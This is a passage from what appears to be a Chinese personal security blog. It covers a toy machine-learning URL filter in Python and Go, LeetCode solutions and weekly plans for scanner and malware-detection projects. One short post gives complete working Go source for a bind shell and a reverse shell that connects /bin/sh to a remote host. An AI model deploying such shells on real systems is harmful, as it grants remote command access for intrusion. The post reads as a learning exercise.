<p>这块其实挺纠结，感觉有劲使不上，看的论文思路有把代码转化成图像的，然后输入到CNN网络里边的，有模仿NLP实现一个多分类的，最后发现这个效果最好，hhhh</p>
<p>咋说呢，还是适合数据集的网络是最好的网络。</p>
<h2 id="两种服务器的交互"><a href="#两种服务器的交互" class="headerlink" title="两种服务器的交互"></a>两种服务器的交互</h2><p>这块实现就简单了，go程序和python程序实现了简单的通信。</p>
<p>python是用了个flask实现，python代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> TfidfVectorizer</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">name</span>):</span><br><span class="line">    filepath = os.path.join(<span class="built_in">str</span>(os.getcwd()), name)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        alldata = f.readlines()</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alldata:</span><br><span class="line">        i = <span class="built_in">str</span>(urllib.parse.unquote(i))</span><br><span class="line">        ans.append(i)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">badqueries = load(<span class="string">&#x27;badqueries.txt&#x27;</span>)</span><br><span class="line">goodqueries = load(<span class="string">&#x27;goodqueries.txt&#x27;</span>)<span class="comment">#导入两类url</span></span><br><span class="line">Y = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(badqueries))]+[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(goodqueries))]<span class="comment">#给标签</span></span><br><span class="line">vectorizer = TfidfVectorizer()<span class="comment">#用来将url向量化</span></span><br><span class="line">X = vectorizer.fit_transform(badqueries+goodqueries)<span class="comment">#直接输进去</span></span><br><span class="line">X_train, X_test, Y_train, Y_test = train_test_split(X, Y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)<span class="comment">#分割训练数据和测试数据</span></span><br><span class="line">lgs = LogisticRegression(class_weight=<span class="string">&#x27;balanced&#x27;</span>) <span class="comment">#简单的逻辑回归二分类</span></span><br><span class="line">lgs.fit(X_train, Y_train)<span class="comment">#begin！</span></span><br><span class="line"><span class="built_in">print</span>(lgs.score(X_test, Y_test))</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/check_url&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(): </span><br><span class="line">    url = request.form[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    X_predict = vectorizer.transform([url])</span><br><span class="line">    res = lgs.predict(X_predict)</span><br><span class="line">    <span class="keyword">if</span> res==<span class="number">1</span>:<span class="keyword">return</span> <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8889</span>)</span><br></pre></td></tr></table></figure>

<p>这块因为精简就放到一个文件中来，完全可以把模型保存起来，因为每次起一次这个服务，都会进行一遍模型的训练，对于这个简单的当然无所谓，但是以后数据量大训个一两天就gg了</p>
<p>go语言如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	// 启动HTTP服务器，监听<span class="number">8000</span>端口</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, handleRequest)</span><br><span class="line">	http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, nil)</span><br><span class="line">	println(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func handleRequest(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	// 从请求中获取URL</span><br><span class="line">	url := r.URL.Path[<span class="number">1</span>:]</span><br><span class="line">	// 发送HTTP请求到Python服务器</span><br><span class="line">	result, err := checkURL(url)</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		// 如果调用失败，返回<span class="number">500</span> Internal Server Error错误</span><br><span class="line">		// 这块也可以优化，python服务器挂了等于go服务器也挂了，hhhh</span><br><span class="line">		http.Error(w, <span class="string">&quot;500 Internal Server Error&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	// 如果返回值为<span class="number">1</span>，禁止访问该URL，否则允许访问</span><br><span class="line">	<span class="keyword">if</span> result == <span class="number">1</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;403 Forbidden&quot;</span>, http.StatusForbidden)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Fprintf(w, <span class="string">&quot;Hello, %s!&quot;</span>, url)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkURL(url string) (<span class="built_in">int</span>, error) &#123;</span><br><span class="line">	// 构造HTTP请求</span><br><span class="line">	data := fmt.Sprintf(<span class="string">&quot;url=%s&quot;</span>, url)</span><br><span class="line">	req, err := http.NewRequest(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://localhost:8889/check_url&quot;</span>, strings.NewReader(data))</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	req.Header.<span class="type">Set</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">	// 发送HTTP请求</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	defer resp.Body.Close()</span><br><span class="line">	// 解析HTTP响应</span><br><span class="line">	body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	result := string(body)</span><br><span class="line">	<span class="keyword">if</span> result == <span class="string">&quot;1\n&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>, nil</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, nil</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>事实上这块服务可能会被逆向攻击，就是用户不断尝试url来把python服务器猜个大概，可能有点类似ssrf？把这个模型逆向出来。所以给个forbidden是绝对不够的，之后要加封 ip 等操作</p>
<h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><ul>
<li>虽然python处理起来挺快的，但是python一旦掉了就影响业务了，所以想了个方法，就是把用户访问的url和用户ip（登陆后用户信息也行）做一个绑定。没收到消息也没关系，把上边的绑定关系记住，当python返回来后直接该封就封，该警告就警告</li>
<li>完善业务，改成个动态网站，这个太low了</li>
<li>不能只根据url，还有body，head的恶意数据也要识别出来，所以找数据或者自己做</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/05/23/2023-05-23-waf/" data-id="cuidwVGZ6z3SDZM9iAc_x0RFZ" data-title="AI 安全之" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2023-05-02-second" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/05/02/2023-05-02-second/" class="article-date">
  <time class="dt-published" datetime="2023-05-01T16:00:00.000Z" itemprop="datePublished">2023-05-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/05/02/2023-05-02-second/">日记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这周主要是写 go ！贼有意思！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">	&quot;net&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;os/exec&quot;</span><br><span class="line">	&quot;log&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	var addr string</span><br><span class="line">	addr = os.Args[1]</span><br><span class="line">	listener, err := net.Listen(&quot;tcp&quot;, addr)//监听端口</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatal(&quot;Error connecting. &quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	for &#123;</span><br><span class="line">		conn, err := listener.Accept()//接受连接</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			log.Println(&quot;accepting connection err: &quot;, err)</span><br><span class="line">		&#125;</span><br><span class="line">		go handleConnection(conn)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func handleConnection(conn net.Conn) &#123;</span><br><span class="line">	var shell = &quot;/bin/sh&quot;</span><br><span class="line">	_, _ = conn.Write([]byte(&quot;bind shell demo\n&quot;))</span><br><span class="line">	command := exec.Command(shell)</span><br><span class="line">	command.Env = os.Environ()</span><br><span class="line">	command.Stdin = conn</span><br><span class="line">	command.Stdout = conn</span><br><span class="line">	command.Stderr = conn</span><br><span class="line">	_ = command.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">	&quot;log&quot;</span><br><span class="line">	&quot;net&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	shell    = &quot;/bin/sh&quot;</span><br><span class="line">	remoteIp string</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	remoteIp = os.Args[1]</span><br><span class="line">	remoteConn, err := net.Dial(&quot;tcp&quot;, remoteIp)//远程过去</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatal(&quot;connecting err: &quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	_, _ = remoteConn.Write([]byte(&quot;reverse_shell demo&quot;))</span><br><span class="line">	command := exec.Command(shell)</span><br><span class="line">	command.Env = os.Environ()</span><br><span class="line">	command.Stdin = remoteConn//置为远程</span><br><span class="line">	command.Stdout = remoteConn</span><br><span class="line">	command.Stderr = remoteConn</span><br><span class="line">	_ = command.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上边的是本地，底下是反向，主要是</p>
<ul>
<li>ip</li>
<li>std 环境</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/05/02/2023-05-02-second/" data-id="cuidCHUf4PJC2vk3mCFANKqvR" data-title="日记" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2023-04-27-leetcode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/04/27/2023-04-27-leetcode/" class="article-date">
  <time class="dt-published" datetime="2023-04-26T16:00:00.000Z" itemprop="datePublished">2023-04-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/04/27/2023-04-27-leetcode/">Leetcode</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这个月开始刷 Leetcode 了,一个月差不多过去了,刷了 80 多道题,开这篇来总结下自己学到啥了吧</p>
<h2 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/two-sum/description/">链接</a></p>
</blockquote>
<p><img src="https://p.ipic.vip/92hlsp.png"></p>
<p>这题太经典了,目前用了三种方法实现,分别是暴力、维护字典、维护一个新数组转化成顺序数组求,代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 暴力</span><br><span class="line">class Solution:</span><br><span class="line">    def twoSum(self, nums: List[int], target: int) -&gt; List[int]:</span><br><span class="line">        n=len(nums)</span><br><span class="line">        for i in range(n):</span><br><span class="line">            for j in range(i+1,n):</span><br><span class="line">                if nums[i]+nums[j]==target:</span><br><span class="line">                    return [i,j]</span><br><span class="line">                    </span><br><span class="line"># 维护字典</span><br><span class="line">class Solution:</span><br><span class="line">    def twoSum(self, nums: List[int], target: int) -&gt; List[int]:</span><br><span class="line">        tmp=dict()</span><br><span class="line">        for i,val in enumerate(nums):</span><br><span class="line">            if val in tmp.keys():</span><br><span class="line">                return [i,tmp[val]] </span><br><span class="line">            tmp[target-val]=i</span><br><span class="line">            </span><br><span class="line"># 转为顺序数组求</span><br><span class="line">class Solution:</span><br><span class="line">    def twoSum(self, nums: List[int], target: int) -&gt; List[int]:</span><br><span class="line">        n=len(nums)</span><br><span class="line">        i=0</span><br><span class="line">        j=n-1</span><br><span class="line">        tmp=list(range(n))</span><br><span class="line">        tmp.sort(key=lambda x:nums[x])# tmp 存 nums 的索引,保证 nums[tmp[i]] 是按序的</span><br><span class="line">        while True:</span><br><span class="line">            s=nums[tmp[i]]+nums[tmp[j]]</span><br><span class="line">            if s==target:</span><br><span class="line">                return [tmp[i],tmp[j]]</span><br><span class="line">            elif s&gt;target:</span><br><span class="line">                j-=1</span><br><span class="line">            else:i+=1</span><br></pre></td></tr></table></figure>

<h2 id="三数之和"><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/3sum/">链接</a></p>
</blockquote>
<p><img src="https://p.ipic.vip/k2e8x7.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def threeSum(self, nums: List[int]) -&gt; List[List[int]]:</span><br><span class="line">        n=len(nums)</span><br><span class="line">        ans=[]</span><br><span class="line">        nums.sort()</span><br><span class="line"></span><br><span class="line">        for i in range(n-2):</span><br><span class="line">            x=nums[i]</span><br><span class="line">            if i&gt;0 and nums[i-1]==x:</span><br><span class="line">                continue</span><br><span class="line">            l=i+1</span><br><span class="line">            k=n-1</span><br><span class="line">            while l&lt;k:</span><br><span class="line">                tmp=x+nums[l]+nums[k]</span><br><span class="line">                if tmp==0:</span><br><span class="line">                    ans.append([x,nums[l],nums[k]])</span><br><span class="line">                    l+=1</span><br><span class="line">                    k-=1   </span><br><span class="line">                    while l&lt;k and nums[l]==nums[l-1]:</span><br><span class="line">                        l+=1</span><br><span class="line">                    while l&lt;k and nums[k]==nums[k+1]:</span><br><span class="line">                        k-=1    </span><br><span class="line">                elif tmp&gt;0:</span><br><span class="line">                    k-=1</span><br><span class="line">                else:</span><br><span class="line">                    l+=1</span><br><span class="line">        return ans</span><br></pre></td></tr></table></figure>

<p>核心就是不能重复,i l k 都要判断一次,另外还有两处优化没写,分别是 i 和它紧接着的两个如果都大于零就可以直接 break 出去了,还有一个是 i 和最后两个加起来小于 0 就可以 continue 了</p>
<h2 id="长度最小的子数组"><a href="#长度最小的子数组" class="headerlink" title="长度最小的子数组"></a>长度最小的子数组</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/minimum-size-subarray-sum/">链接</a></p>
</blockquote>
<p><img src="https://p.ipic.vip/55l2r6.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def minSubArrayLen(self, target: int, nums: List[int]) -&gt; int:</span><br><span class="line">        n=len(nums)</span><br><span class="line">        ans=n+1</span><br><span class="line">        l=0</span><br><span class="line">        tmp=0</span><br><span class="line">        for i in range(n):</span><br><span class="line">            tmp+=nums[i]</span><br><span class="line">            while tmp&gt;=target:</span><br><span class="line">                tmp-=nums[l]</span><br><span class="line">                ans=min(ans,i-l+1)</span><br><span class="line">                l+=1</span><br><span class="line">        return ans if ans&lt;=n else 0</span><br></pre></td></tr></table></figure>

<p>同向双指针的套路题,<a target="_blank" rel="noopener" href="https://leetcode.cn/problems/subarray-product-less-than-k/">713. 乘积小于 K 的子数组</a>和<a target="_blank" rel="noopener" href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a>是一样的.</p>
<h2 id="接雨水"><a href="#接雨水" class="headerlink" title="接雨水"></a>接雨水</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/trapping-rain-water/description/">链接</a></p>
</blockquote>
<p><img src="https://p.ipic.vip/mix543.png"></p>
<p>会的第一道困难题,和<a target="_blank" rel="noopener" href="https://leetcode.cn/problems/container-with-most-water/description/">11. 盛最多水的容器</a>挺像的,不过思路不太一样,后者是个贪心,前者选前缀和后缀的最小再减去个自身高度.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def trap(self, height: List[int]) -&gt; int:</span><br><span class="line">        n = len(height)</span><br><span class="line">        fi=[0]*n</span><br><span class="line">        fi[0]=height[0]</span><br><span class="line">        for i in range(1,n):</span><br><span class="line">            fi[i]=max(height[i],fi[i-1])</span><br><span class="line">        we=[0]*n</span><br><span class="line">        we[-1]=height[-1]</span><br><span class="line">        for i in range(n-2,-1,-1):</span><br><span class="line">            we[i]=max(height[i],we[i+1])</span><br><span class="line">        ans=0</span><br><span class="line">        for i,j,k in zip(fi,we,height):</span><br><span class="line">            ans+=min(j,i)-k</span><br><span class="line">        return ans</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/27/2023-04-27-leetcode/" data-id="cuidKYaRQdGzYUPrBimwXu55L" data-title="Leetcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2023-04-24-first" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/04/24/2023-04-24-first/" class="article-date">
  <time class="dt-published" datetime="2023-04-23T16:00:00.000Z" itemprop="datePublished">2023-04-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/04/24/2023-04-24-first/">安全开发</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>目前是三条线在并行，一个是油猴插件，一个就是 go 的安全工具开发，还有个就是 ai 来处理恶意代码，下面简单汇报一下第一周的进展</p>
<h2 id="油猴插件"><a href="#油猴插件" class="headerlink" title="油猴插件"></a>油猴插件</h2><blockquote>
<p>kids like bili</p>
</blockquote>
<p>油猴的插件想实现一个模仿青少年模式的东西，目前是完成了单体的，技术栈是 ajax 和 nodejs</p>
<p>整体效果就是两个客户端，一个服务端，两个客户端通过 ajax 的轮询方式将服务端当成个通道实现了 A 客户端控制 B 客户端</p>
<p>但还有好多东西可以加：首先就是功能方面想把 token<br>或者 session 引进来实现多个用户的受害（bushi ，还有一个就是安全方面的防护，主要是考虑这么几件事，就是把 B 客户端当成一个技术高手，如何防护 B<br>逃脱 A 的控制，比如直接把插件关掉（目前两个想法，一个是在搞一个守护进程，还有个就是把自己这个文件给输出出来给服务端，服务端看代码改没改），或者是 A<br>客户端能否通过水平越权的方式实现控制别的 B ？引进来 token 就简单了，下周看看</p>
<h2 id="go-安全工具开发"><a href="#go-安全工具开发" class="headerlink" title="go 安全工具开发"></a>go 安全工具开发</h2><blockquote>
<p>扫描器</p>
</blockquote>
<p>这个简单多了，就是无脑暴力，先扫描端口，用了 SYN 扫描，然后使用 channel 并发的方式实现一个比较循序渐进的扫描，然后看了好几个库，通过引入 go 插件的方式实现了针对特定端口的爆破</p>
<p>下周想想还能加点什么，整体感觉其实没啥技术含量（😂 ，主要两个想法，一个是指纹识别，一个就是看看能不能直接用抓包的方式逆向逆向这些协议，大工程！</p>
<h2 id="ai-处理恶意代码"><a href="#ai-处理恶意代码" class="headerlink" title="ai 处理恶意代码"></a>ai 处理恶意代码</h2><p>这周算是刚开始吧，第一个贼有意思，看了几篇论文，就是把恶意代码的代码用 ida 啊啥的反编译出来，然后转成个图，之后就简单了，老本行 CNN 图像识别，但效果很好。</p>
<p>第二个是直接用 nlp 的思路来识别恶意代码，但我听了一波本科好哥们的做法，感觉很蠢啊，代码每个变量都当成了个向量，这也太占内存了，我下周想想优化下，感觉应该不难</p>
<p>第三个就是用传统机器学习实现特征分类（恶意流量的，github 上找了几个，我打算自己写个，数据集什么的还挺多，简单！</p>
<h2 id="总结-下周计划"><a href="#总结-下周计划" class="headerlink" title="总结 &amp; 下周计划"></a>总结 &amp; 下周计划</h2><p>其实还是挺后悔没早点开始的，感觉东西好多啊，还得把自己的论文发出去，还得看算法，自己是真的菜，还想复现几个 CVE 和挖洞呢。不说了不说了冲冲冲！</p>
<ul>
<li>插件继续编写，把服务器充分用上</li>
<li>go 开发继续继续，加想法，敲代码，嘿嘿</li>
<li>老本行 ai 继续搞起来</li>
<li>任何想做的做就好了！</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/24/2023-04-24-first/" data-id="cuidL-m0pjc1tXok934qO62nv" data-title="安全开发" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2023-03-08-WorkForWork" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/03/08/2023-03-08-WorkForWork/" class="article-date">
  <time class="dt-published" datetime="2023-03-07T16:00:00.000Z" itemprop="datePublished">2023-03-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
